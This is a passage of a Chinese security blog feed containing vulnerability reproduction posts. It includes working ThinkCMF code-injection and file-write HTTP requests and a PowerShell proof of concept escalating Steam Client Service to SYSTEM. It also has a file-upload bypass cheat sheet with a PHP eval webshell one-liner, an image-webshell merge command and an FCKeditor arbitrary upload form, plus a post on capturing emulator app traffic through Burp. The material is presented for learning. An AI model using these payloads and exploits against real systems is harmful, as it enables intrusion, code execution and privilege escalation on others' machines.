<strong>ThinkCMF5.0.19</strong> 这个版本后台提供路由自定义，其中路由的别名对单引号缺少过滤，导致引发漏洞。 </p></blockquote><p><img src="https://i.loli.net/2019/11/02/EylYqHLMFho4ZXi.png" alt="image-20191029143132713.png"></p><pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.147/portal/admin_category/addpost.html HTTP/1.1</span><span class="token header-name keyword">Host:</span> 192.168.0.147<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Cookie:</span> thinkphp_show_page_trace=0|0; PHPSESSID=vul4kkt8su0po91d6kc28ho2vb; thinkphp_show_page_trace=0|0; admin_username=1%40qq.com<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 65parent_id=0&amp;name=111&amp;alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过”添加分类” -&gt; 分类别名处输入恶意代码<code>1&#39;=&gt;array(&quot;&quot;),phpinfo(),&#39;2</code></p><p><img src="https://i.loli.net/2019/11/02/dUW1lGMfOagI9vo.png" alt="image-20191029142805050.png"></p><p>刷新就能够看到代码执行成功。</p><p><img src="https://i.loli.net/2019/11/02/byPtMOxQ9izuJkU.png" alt="image-20191029142851626.png"></p><h3 id="0x04-ThinkCMFX-文件包含漏洞-可写入任意文件"><a href="#0x04-ThinkCMFX-文件包含漏洞-可写入任意文件" class="headerlink" title="0x04 ThinkCMFX 文件包含漏洞(可写入任意文件)"></a>0x04 ThinkCMFX 文件包含漏洞(可写入任意文件)</h3><p> 通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件,phpinfo版payload如下： </p><pre class="line-numbers language-http"><code class="language-http">GET http://192.168.0.112/ThinkCMFX/?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php phpinfo(); ?>')&lt;/php>  HTTP/1.1<span class="token header-name keyword">Host:</span> 192.168.0.112<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/VpbRTBHiOgMevZ4.png" alt="image-20191029143839192.png"></p><p>然后访问test.php，可以看到phpinfo已经加载出来 </p><p><img src="https://i.loli.net/2019/11/02/ZjIkdO2riUK4qPl.png" alt="image-20191029144007923.png"></p><h4 id="分析分析"><a href="#分析分析" class="headerlink" title="分析分析"></a>分析分析</h4><p>首先打开index.php文件找到项目路径，然后定位到application路径下。<br><img src="https://i.loli.net/2019/11/02/AgS4TWMCJXxLd8K.png" alt="image-20191029144230595.png"></p><p> 在项目路径下找到入口分组的控制器类选择<strong>IndexController</strong> 控制器类打开 </p><p><img src="https://i.loli.net/2019/11/02/gRB8TK3yskHUhqr.png" alt="image-20191029144410688.png"><br> 打开<code>application/Portal/Controller/IndexController</code>，发现display方法，继续追踪HomebaseController </p><p><img src="https://i.loli.net/2019/11/02/zBI9cM5P34foUXF.png" alt="image-20191029144518781.png"></p><p> 通过HomebaseController，找到display方法，display函数的作用是加载模板和页面输出，templateFile为模板文件地址，charset为模板字符集，contentType为输出类型，content为输出内容。另外存在public权限的函数还有fetch，fetch函数的作用是获取页面内容，templateFile为模板文件，content为输出内容，prefix为模板缓存前缀。 </p><p> templateFile参数会经过parseTemplate函数处理，判断模板是否存在，当模板不存在时会在当前目录下开始查找，这里可以配合一处上传形成文件包含。</p><p>因此形成的payload ：</p><pre class="line-numbers language-http"><code class="language-http">index.php?a=display&amp;templateFile=README.md <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/jfi96EsxAbTwBHz.png" alt="image-20191029144736031.png"></p><p> fetch函数的作用是获取页面内容，调用内置模板引擎fetch方法，thinkphp的模版引擎使用的是smarty，在smarty中当key和value可控时便可以形成模板注入。<br><img src="https://i.loli.net/2019/11/02/rfbmWisO5eLtnR2.png" alt="image-20191029144805554.png"></p><p> 这里fetch函数的三个参数分别对应模板文件，输出内容，模板缓存前缀。利用时templateFile和prefix参数可以为空，在content参数传入待注入的php代码即可。最终形成的</p><p>payload：</p><pre class="line-numbers language-http"><code class="language-http">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php phpinfo(); ?>')&lt;/php><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><p><a href="https://xz.aliyun.com/t/3529" target="_blank" rel="noopener">https://xz.aliyun.com/t/3529</a></p><p><a href="https://github.com/thinkcmf/cmfx/issues/26" target="_blank" rel="noopener">https://github.com/thinkcmf/cmfx/issues/26</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试 APP流量通用抓包方法</title>
      <link href="/2019/10/26/app-traffic-general-packet-capture-method/"/>
      <url>/2019/10/26/app-traffic-general-packet-capture-method/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试-APP流量通用抓包方法"><a href="#渗透测试-APP流量通用抓包方法" class="headerlink" title="渗透测试 APP流量通用抓包方法"></a>渗透测试 APP流量通用抓包方法</h2><p><strong>好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。</strong></p><p><img src="https://i.loli.net/2019/10/26/io69WNfjFtHCnVs.png" alt="1572072179795.png"></p><blockquote><p>毕老师之前开会的时候提起过微信、支付宝、抖音类的App会检测手机的是否挂代理，就是说不能直接在手机代理的地方做手脚，不然就会被检测到  :)</p></blockquote><h2 id="0x01-Proxifier代理介绍"><a href="#0x01-Proxifier代理介绍" class="headerlink" title="0x01 Proxifier代理介绍"></a>0x01 Proxifier代理介绍</h2><p><strong>首先介绍下Proxifier：</strong></p><blockquote><p>​    Proxifier是一款功能非常强大的代理客户端，支持Windows XP/Vista/Win7/Win10 和 MacOS，支持http/https、socks4/5、TCP、UDP等协议，可以指定端口，指定IP，指定域名、指定程序、指定用户名密码授权等运行模式，兼容性非常好，有点类似SOCKSCAP。</p><p>​    有许多网络应用程序不支持通过代理服务器工作，不能用于局域网或防火墙后面。这些会损害公司的隐私和导致很多限制。Proxifier解决了这些问题和所有限制，让您有机会不受任何限制使用你喜爱的软件。 此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p></blockquote><p>​    </p><h4 id="1-2-Proxifier代理流程"><a href="#1-2-Proxifier代理流程" class="headerlink" title="1.2 Proxifier代理流程"></a>1.2 Proxifier代理流程</h4><blockquote><p>翻墙 | 端口转发 </p></blockquote><p>代理流程主要分为两步：</p><p>1、添加代理服务器（Socks5）</p><p>2、设置代理规则（ 设置需要设置代理 <strong>应用程序</strong>）</p><p>这时候应用程序 <strong>所有流量</strong> 经过代理服务器（实现翻墙）</p><p><img src="https://i.loli.net/2019/08/18/y38JpfearHFxChE.png" alt="1566039519579.png"></p><p> 这样，只要选择需要代理的应用程序，比如chrome.exe，即可实现代理流量转发 </p><h2 id="0x02-设立猜想"><a href="#0x02-设立猜想" class="headerlink" title="0x02 设立猜想"></a>0x02 设立猜想</h2><p>​    梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：</p><p>​    代理到Socks5 流量就全部走 <strong>小飞机</strong> ，也就是说小飞机就是<strong>流量的出口</strong>。</p>  <div align="center"><img width="100" height="120" src="https://i.loli.net/2019/10/26/zlI2ne845CJTbjE.png"></div>  <p> 注意到<strong>添加代理服务器协议处有一个HTTPS的代理方式</strong> Burp也是通过代理进行收发流量的。</p><p>这样就跟浏览器挂代理抓包原理是一样的。</p><p><strong>猜想建立</strong> -&gt; 用代理转发工具将流量出口代理到Burp 8080端口  </p><p>​                     -&gt; 注入流量（<strong>模拟器有很多进程，其中有个进程是网络的进程</strong>）</p><p> 安卓模拟器大多是使用virtualbox的虚拟网卡进行的网络通信，那么，如果直接将模拟器的网络进程的所有流量代理到burpsite即可抓取流量包，同时又绕过了关于客户端的相关校验。 </p><p> 打开模拟器分析网络进程，会发现模拟器使用的网络进程有：<code>virtualbox headless fronrend</code>和<code>NoxVMHandle Frontend</code>。 </p><p><img src="https://i.loli.net/2019/08/18/6yRk7JtQTKaDpns.png" alt="1566036600076.png"></p><p>总体流程图如下：</p><p><img src="https://i.loli.net/2019/08/18/VyMN7CgBmspZ4PR.png" alt="image.png"></p><h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><h3 id="2-1-设置Proxifier代理服务器"><a href="#2-1-设置Proxifier代理服务器" class="headerlink" title="2.1 设置Proxifier代理服务器"></a>2.1 设置Proxifier代理服务器</h3><p>代理服务器设置为burp监听端口。</p><p><img src="https://i.loli.net/2019/10/26/hyzJKiCj6217eNs.png" alt="1572071477649.png"></p><h3 id="2-2-设置代理规则"><a href="#2-2-设置代理规则" class="headerlink" title="2.2 设置代理规则"></a>2.2 设置代理规则</h3><p>将<code>NoxVMHandle Frontend</code>进程对应的应用程序文件加入代理规则。</p><p><img src="https://i.loli.net/2019/10/26/myaVUqeWZvJkjfd.png" alt="1572071517431.png"></p><h3 id="2-3-安装证书"><a href="#2-3-安装证书" class="headerlink" title="2.3 安装证书"></a><strong>2.3 安装证书</strong></h3><p>这里不再详细讲。 </p><p>虚拟机都是用的虚拟网卡 不能直接访问到宿主机</p><p><img src="https://i.loli.net/2019/08/18/8ZcpQOV9B2HUCnd.png" alt="1566045141291.png"></p><p>将Burp的CA证书文件复制到模拟器安装就可以了</p><h3 id="2-4-抓取流量包"><a href="#2-4-抓取流量包" class="headerlink" title="2.4 抓取流量包"></a>2.4 抓取流量包</h3><p> 配置之后，即可在proxifier中获取到模拟器内对应app的流量 </p><p>这样模拟器的流量就全部走向Burp了 </p><p><img src="https://i.loli.net/2019/08/18/ufnMjyZVIN9tFiW.png" alt="1566045307683.png"></p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>微信登录数据包</p><p><img src="https://i.loli.net/2019/08/18/S2ygPmRKVMltanC.png" alt="1566045296943.png"></p><p><img src="https://i.loli.net/2019/08/18/gZwlNuF9WtfzYqK.png" alt="1566046032964.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam Windows客户端本地提权0day</title>
      <link href="/2019/09/15/steam/"/>
      <url>/2019/09/15/steam/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/09/15/QRzGdxYSFe2WuEC.png" alt="1565358388489.png"></p><blockquote><p>适用于Windows系统流行得Steam游戏客户端存在提权0Day漏洞，该漏洞可允许具有低权限攻击者以管理员身份运行程序</p></blockquote><p>漏洞描述：</p><p>这个漏洞是由一些权限升级产生的Bug，使低权限的用户可以直接利用缺陷提升权限或以管理员身份启动可执行程序。由于Steam拥有超过1亿注册用户，并且一次有数百万注册的用户，这是一个严重的风险，可能被恶意软件滥用以执行挖矿各种危险操作。</p><p><img src="https://i.loli.net/2019/09/15/bVTd2hUcE9oM8ux.png" alt="1565358931183.png"></p><p>在Valve确定该漏洞为“严重”后，两位研究人员公开披露了Steam客户的零日漏洞。该公司选择不给予奖励赏金或表明他们会修复它，并告诉研究人员他们不被允许透露它。</p><p>​    在昨天发布的一份报告中，安全研究员 <em>Felix</em>  正在分析与Steam相关的一项名为“Steam客户端服务”的Windows服务，该服务在Windows上启动了具有SYSTEM权限的可执行文件。研究人员还注意到该服务可以由“用户”组启动和停止，“用户”组几乎都是登录计算机的人。</p><p>但是，此服务的注册表项不能由“用户”组写入，因此无法修改它以启动其他可执行文件并将其权限提升为管理员。</p><h3 id="本地提权0day"><a href="#本地提权0day" class="headerlink" title="本地提权0day"></a>本地提权0day</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p> 漏洞本身非常简单。 Steam出于某些内部目的安装“Steam客户端服务”服务。 检查服务的SDDL（<a href="https://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com.hk&sl=auto&sp=nmt4&tl=zh-CN&u=https://habr.com/ru/company/pm/blog/442662/&xid=17259,15700022,15700186,15700191,15700256,15700259,15700262,15700265&usg=ALkJrhg99E1VtD9Fvr-7q5sBgaM5JE2UlQ" target="_blank" rel="noopener">https://habr.com/ru/company/pm/blog/442662/</a> ）：</p><p><img src="https://i.loli.net/2019/09/15/e8Cj9DPnzSF7YlX.png" alt="1565359743274.png"></p><p>最有趣的部分是<em>（A ;; RPWP ;;; BU）</em> 。 这意味着允许来自“用户”组的任何用户启动和停止服务。</p><p> <strong>Service</strong>枚举<code>HKLM\Software\Wow6432Node\Valve\Steam\Apps</code>的子项，并为每个子项设置一些安全描述。</p><p><img src="https://i.loli.net/2019/09/15/i7BH5NXjvAKQhS3.png" alt="1565359352820.png"></p><p>创建了测试密钥<code>HKLM\Software\Wow6432Node\Valve\Steam\Apps\test</code>并重新开启服务(Procmon的日志再上面)并检查了注册表密钥权限。</p><p>在这里，发现<code>HKLM\SOFTWARE\Wow6432Node\Valve\Steam</code>对“Users”组具有明确的“完全控制”，并且这些权限将继承所有子项及其子项。 假设RegSetKeySecurity设置了相同的权限，如果有符号链接会发生一些有趣的事情。 我创建了一个从<code>HKLM\SOFTWARE\Wow6432Node\Valve\Steam\Apps\test</code>到<code>HKLM\SOFTWARE\test2</code>的链接，然后重新启动了该服务。</p><p><img src="https://i.loli.net/2019/09/15/4tbom36vYDEpJhR.png" alt="1565359879410.png"></p><p>Steam的服务为我们的目标密钥设置安全描述符。 查看SDDL以获取密钥（省略了非感兴趣的数据）：</p><p><em>（A; ID; KA ;;; BU）（A; OICIIOID; GA ;;; BU）</em></p><p>换句话说，它意味着对所有用户的密钥的完全（读和写）访问。 这是服务为密钥设置的安全描述符。</p><p>因此，现在我们有一个原语来控制注册表中的几乎每个键，并且很容易将其转换为完整的EoP（特权升级）。 我选择与服务“Windows Installer”对应的密钥<code>HKLM\SYSTEM\ControlSet001\Services\msiserver</code>，它可以由任何用户启动，与Steam的服务相同，但运行程序为NT AUTHORITY \ SYSTEM。 控制之后，只需要更改<code>HKLM\SYSTEM\ControlSet001\Services\msiserver</code>键的ImagePath值并启动“Windows Installer”服务。 ImagePath的程序将作为<em>NT AUTHORITY\SYSTEM</em>启动。</p><p><img src="https://i.loli.net/2019/09/15/ogre7RsvSJPVLYq.png" alt="1565360328809.png"></p><p>将所有内容放在一起，这样就获得漏洞，允许在安装了Steam的任何Windows计算机上运行具有最高权限的任何程序。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>//FileName SteamEop.ps1Write-Host &quot;[*] Installing NTObjectManager...&quot;install-module NTObjectManager -Scope CurrentUser -Forceimport-module NTObjectManagerWrite-Host &quot;[*] Removing HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;Remove-Item -Path &quot;HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;Write-Host &quot;[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot;[NtApiDotNet.NtKey]::CreateSymbolicLink(&quot;\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;,$null, &quot;\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot;)Write-Host &quot;[*] Registry Symbolic link created, restarting the Steam Client Service&quot;Get-Service &quot;Steam Client Service&quot; | Restart-ServiceWrite-Host &quot;[*] Sleeping 5 seconds&quot;Start-Sleep 5Write-Host &quot;[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service should be overwritten&quot;Write-Host &quot;[*] Modifying the binPath on the Steam Client Service...&quot;Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot; -Name &quot;ImagePath&quot; -Value &quot;C:\Windows\System32\cmd.exe /c cmd.exe&quot;Write-Host &quot;[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it&quot;Get-Service &quot;Steam Client Service&quot; | Restart-ServiceWrite-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&quot;</code></pre><p><img src="https://i.loli.net/2019/09/15/KxGzCyeJLdZ4sDX.png" alt="1565360179185.png"></p><p><em>仅供参考学习 禁止犯法</em></p><p>参考：<a href="https://twitter.com/PsiDragon" target="_blank" rel="noopener">https://twitter.com/PsiDragon</a></p><p>​            <a href="https://www.bleepingcomputer.com/news/security/steam-zero-day-vulnerability-affects-over-100-million-users/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/steam-zero-day-vulnerability-affects-over-100-million-users/</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件解析漏洞总结</title>
      <link href="/2019/09/15/parsing-vulnerability/"/>
      <url>/2019/09/15/parsing-vulnerability/</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​    该漏洞与Nginx和PHP版本无关，属于用户配置不当造成的解析漏洞<br>​    该Nginx解析漏洞成因为：服务器可能错误的将任何类型的文件以PHP的方式进行解析</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>先探明是Nginx服务器</li><li>单独打开一张该网站的图片，url后加上字符串“/.php”<br>倘若没有提示404，而是出现了一堆乱码，证明该漏洞存在 ### 3：漏洞利用</li><li>上传图片webshell，测试</li></ul><p><img src="https://i.loli.net/2019/09/01/GTE7eAwyVdYN4tF.png" alt="image.png"></p><h2 id="Apache-mime-解析漏洞"><a href="#Apache-mime-解析漏洞" class="headerlink" title="Apache mime 解析漏洞"></a>Apache mime 解析漏洞</h2><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>Apache服务器解析文件检查后缀名时，从右往左检查，遇到它不认识的后缀名跳过使用前一个后缀名。例如<code>1.php.cvb</code>文件，将会被解析为PHP文件，该漏洞存在于使用module模式与php结合的版本中 ，Apache低版本中较常见，如低于2.0.65的2.0.x系列。</p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>将php的webshell重命名为<code>XXX.php.rar</code> 尝试上传，上传成功后，执行命令测试</p><p><img src="https://i.loli.net/2019/09/01/a7JOymKqgZGow3R.png" alt="image.png"></p><h2 id="Apache解析漏洞（CVE-2017-15715）"><a href="#Apache解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache解析漏洞（CVE-2017-15715）"></a>Apache解析漏洞（CVE-2017-15715）</h2><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>​    在Apache的默认配置中用正则来匹配后缀进行php解析，而关键问题就出现在正则匹配中的$上，当设置了上传的黑名单，在设置了 RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符，所以当上传的文件后缀名后增加一个换行符，则可以绕过黑名单，被当做PHP进行解析。</p><ul><li>①：上传PHP文件，报错提示上传文件类型不允许</li><li>②：再次上传，抓包，通过HEX 编码在.p  hp后缀后面加一个/x0a，即换行符，上传成功。</li></ul><h2 id="HTTP头检测绕过"><a href="#HTTP头检测绕过" class="headerlink" title="HTTP头检测绕过"></a>HTTP头检测绕过</h2><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，程序员在判断访客提交的数据时，判断代码只判断http头信息里的文件类型或者检测文件的扩展名来判断文件是否合法，导致访客提交修改过的http头信息绕过判断上传，造成此漏洞</p><h4 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h4><p>先上传PHP文件，上传失败，将该PHP文件后缀名改为jpg，成功上传，则存在该漏洞</p><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><p>抓包，修改Content-Type，将<code>Content-Type: application/octet-stream</code>修改为<code>Content-Type: image/jpeg</code></p><p><img src="https://i.loli.net/2019/09/01/WrBeXfoiMdRc1AL.png" alt="image.png"></p><h2 id="扩展名检测绕过"><a href="#扩展名检测绕过" class="headerlink" title="扩展名检测绕过"></a>扩展名检测绕过</h2><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>程序在判断上传文件类型时，通过检测文件的扩展名来判断文件是否为可执行脚本名，如果只设置了黑名单，导致访客提交可执行文件的扩展名不在黑名单类型里，绕过判断上传，造成此漏洞。</p><h4 id="探测-1"><a href="#探测-1" class="headerlink" title="探测"></a>探测</h4><p>先上传服务器支持的脚本语言的文件，上传不通过，提示不允许上传asp文件或php文件等，修改后缀名重新上传，上传成功，即可证明存在该漏洞</p><h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h4><ul><li>①：找黑名单扩展名的漏网之鱼 - 比如asa和cer之类</li><li>②：可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li><li>③：特别文件名构造<br>比如发送的http包里把文件名改成 <code>help.asp.</code>或 <code>help.asp_</code>(下划线为空格)，这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然 后绕过验证后，会被 windows 系统自动去掉后面的点和空格。</li><li>④：后缀名修改为Asp成功上传，可菜刀连接</li></ul><p><img src="https://i.loli.net/2019/09/01/Wtn9s2dcwvmeYfo.png" alt="image.png"></p><h2 id="检测文件头绕过"><a href="#检测文件头绕过" class="headerlink" title="检测文件头绕过"></a>检测文件头绕过</h2><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>上传程序判断文件是否可以上传的方法是检测文件类型，一旦文件类型在白名单内，即可上传成功。</p><h4 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h4><ul><li>①：简单粗暴法：将原来的webshell一句话修改文件头<br>例：<code>GIF89a &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></li><li>②：图片和webshell合成：<code>copy XX.jpg/b+XX.php/a XXX.php</code></li></ul><p><img src="https://i.loli.net/2019/09/01/WCiZlOIwj4gEJBM.png" alt="image.png"></p><h2 id="本地JS检测绕过"><a href="#本地JS检测绕过" class="headerlink" title="本地JS检测绕过"></a>本地JS检测绕过</h2><p>本地JS检测上传文件后缀，设置了白名单，可通过禁用JS的方法，绕过上传。</p><ul><li>注：一般在上传或者检测输入字符是否非法十分快速时，例如刚输完就报错，很有可能就是本地检测<br>火狐JS 禁用的方法：</li><li>地址栏输入<code>about:config</code></li><li>回车后点我已了解此风险</li><li>搜索栏，搜索<code>javascript.enabled</code></li><li>双击即可禁用或打开</li></ul><p>或者</p><ul><li>先将上传的文件改成合理的后缀，使用Burp抓包修改后缀名为解析的文件。</li></ul><h2 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h2><h3 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h3><h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>网站上传图片的时候，将网页木马文件的名字改成<code>*.asp;.jpg</code>，也同样会被IIS当作asp文件来解析并执行。该文件可以被当作asp文件解析并执行</p><h4 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h4><ul><li>首先判断该网站服务器为IIS，操作系统是windows server</li><li>在允许上传的位置，测试发现只允许上传图片</li><li>将asp 小马后缀名修改 <code>XX.asp;.jpg</code>上传</li></ul><h3 id="asp文件夹解析"><a href="#asp文件夹解析" class="headerlink" title="*.asp文件夹解析"></a>*.asp文件夹解析</h3><h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>IIS服务器，在网站下建立文件夹的名字为<code>*.asp、*.asa</code>的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p><h4 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h4><p>在访问该网站时，一旦可以上传文件的页面地址栏有类似<code>http:// ***/*.asp/***</code>时，即存在*.asp文件夹，则可能存在该漏洞，将webshell文件后缀名修改为可上传的后缀类型，上传成功后菜刀连接即可。</p><h2 id="00空字符截断"><a href="#00空字符截断" class="headerlink" title="%00空字符截断"></a>%00空字符截断</h2><h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p>用asp写入文件时，如果文件名字里插入了 NULL字节，那么NULL字节后面的字符就会被忽略。例如正常的文件路径123.jpg ,当123.jpg 的名字改成<code>123.aspNULL.jpg</code> 则写入的文件实际是<code>123.asp</code>。 如果asp程序NULL字节可以插入到文件名的参数里并且没有进行安全的过滤，就形成了NULL字节路径截断漏洞。</p><pre><code>  字符阶段被利用最多的是再文件操作上面，通常用来利用文件包含漏洞和文件上传漏洞，%00即NULL 是会被GPC和addslashess()函数过滤，另外再php5.3之后的版本全面修复了文件名%00截断的问题</code></pre><h3 id="利用-7"><a href="#利用-7" class="headerlink" title="利用"></a>利用</h3><ul><li>上传图片马，使用burp抓包,这里路径和文件名两个参数我们可控，如果服务器程序没做验证的话，我们这里可以上传任意类型的问题。</li></ul><p><img src="https://i.loli.net/2019/09/01/2TBWvwPixFlYLSI.png" alt="image.png"></p><ul><li><p>修改文件名，在其后面加上 <code>.asp</code>  </p></li><li><p>点击 <code>Hex</code> 找到修改的文件名对应的编码，将空格的<code>20</code>编码修改为<code>00</code>，修改完后<code>Go</code>发送，上传成功</p></li></ul><h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><h3 id="Ewebeditor"><a href="#Ewebeditor" class="headerlink" title="Ewebeditor"></a>Ewebeditor</h3><h4 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h4><p>​    eWebEditor是一个基于浏览器的在线HTML编辑器，WEB开发人员可以用它把传统的多行文本输入框 “textarea”替换为可视化的富文本输入框。</p><h4 id="利用-8"><a href="#利用-8" class="headerlink" title="利用"></a>利用</h4><ul><li><p><code>/editor</code>  目录打开后重定向到/evebeditor/admin目录下 </p></li><li><p>访问/ewebeditor/admin_login.asp该路径，进入管理员登陆页面，默认用户名密码都为root</p></li><li><p>访问/ewebeditor/db/ewebeditor.mdb该路径，可以下载该编辑器数据库文件，可以找到以md5值存储的用户名和密码。</p><ul><li>进入后台后，修改允许上传的权限，这里服务器是IIS ，添加了asp</li></ul></li></ul><h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><h4 id="简介-10"><a href="#简介-10" class="headerlink" title="简介"></a>简介</h4><p>​    FCKeditor编辑器是目前最优秀的可见即可得| |网页编辑器之一，它采用的的的JavaScript 编写具备功能强大，配置容易，跨浏览器，支持多种编程语言，开源等特点。FCKeditor编辑器轻量化，不需要太复杂的安装步骤即可使用。</p><h4 id="利用-9"><a href="#利用-9" class="headerlink" title="利用"></a>利用</h4><ul><li>查看FCK编辑器版本 <code>FCKeditor/_whatsnew.html</code></li></ul><p><strong>Version 2.2 版本</strong></p><ul><li>Apache+linux 环境下在上传文件后面加个.突破！测试通过。</li></ul><p><strong>Version &lt;=2.4.2 For php</strong></p><ul><li>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。</li></ul><pre><code>&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;action=&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;</code></pre><p><strong>FCKeditor 文件上传“.”变“_”下划线的绕过方法</strong></p><ul><li><p>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。</p></li><li><p>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试。</p></li><li><p>继续上传同名文件可变为shell.php;(1).jpg 